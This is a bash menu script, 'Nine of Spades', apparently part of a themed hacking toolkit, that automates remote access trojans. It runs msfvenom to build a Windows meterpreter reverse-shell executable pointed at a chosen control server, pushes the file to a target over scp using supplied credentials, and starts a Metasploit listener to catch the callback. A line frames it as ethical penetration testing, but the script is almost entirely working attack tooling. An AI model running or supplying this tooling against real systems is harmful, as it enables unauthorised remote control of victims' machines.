#!/bin/bash

CYAN='\033[1;36m'
RESET='\033[0m'

# Menu for the Nine of Spades Card
nine_of_spades_menu() {
    clear
    echo -e "${CYAN}"
    echo "      __________________________________________________________________________"
    echo "     |                              Nine of Spades                              |"
    echo "     |                      Install Remote Access Trojans                       |"
    echo "     |__________________________________________________________________________|"
    echo "     |                                                                          |"
    echo "     |  This card allows you to generate and deploy Remote Access Trojans       |"
    echo "     |  (RATs) for ethical penetration testing and training scenarios.          |"
    echo "     |                                                                          |"
    echo "     |                                                                          |"
    echo "     |  1. Generate a RAT payload                                               |"
    echo "     |  2. Deploy the RAT to a remote system                                    |"
    echo "     |  3. Monitor RAT activity                                                 |"
    echo "     |  4. Exit                                                                 |"
    echo "     |__________________________________________________________________________|"
    echo -e "${RESET}"
    read -p "Enter your choice: " choice
    case $choice in
        1) generate_rat_payload ;;
        2) deploy_rat ;;
        3) monitor_rat_activity ;;
        4) exit 0 ;;
        *) echo "Invalid choice. Try again."; sleep 1; nine_of_spades_menu ;;
    esac
}

# Generate a RAT payload
generate_rat_payload() {
    clear
    echo -e "${CYAN}Generating a RAT payload...${RESET}"
    read -p "Enter the IP address of the control server: " server_ip
    read -p "Enter the port for the RAT to communicate on: " server_port
    payload_file="rat_payload_$(date +%Y%m%d%H%M%S).exe"
    msfvenom -p windows/meterpreter/reverse_tcp LHOST="$server_ip" LPORT="$server_port" -f exe -o "$payload_file"
    echo -e "${CYAN}Payload generated: $payload_file.${RESET}"
    echo "Use the following command to start a listener:"
    echo "msfconsole -q -x \"use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $server_ip; set LPORT $server_port; exploit\""
    read -n 1 -s -r -p "Press any key to return to the menu..."
    nine_of_spades_menu
}

# Deploy the RAT to a remote system
deploy_rat() {
    clear
    echo -e "${CYAN}Deploying the RAT to a remote system...${RESET}"
    read -p "Enter the path to the RAT payload: " payload_path
    read -p "Enter the target IP address: " target_ip
    read -p "Enter the target username: " username
    read -s -p "Enter the target password: " password
    echo ""
    sshpass -p "$password" scp "$payload_path" "$username@$target_ip:~/"
    echo -e "${CYAN}Payload deployed to $target_ip.${RESET}"
    read -n 1 -s -r -p "Press any key to return to the menu..."
    nine_of_spades_menu
}

# Monitor RAT activity
monitor_rat_activity() {
    clear
    echo -e "${CYAN}Monitoring RAT activity...${RESET}"
    echo "Starting listener..."
    read -p "Enter the IP address of the control server: " server_ip
    read -p "Enter the port for the RAT to communicate on: " server_port
    msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $server_ip; set LPORT $server_port; exploit"
    echo -e "${CYAN}Listener stopped.${RESET}"
    read -n 1 -s -r -p "Press any key to return to the menu..."
    nine_of_spades_menu
}

nine_of_spades_menu
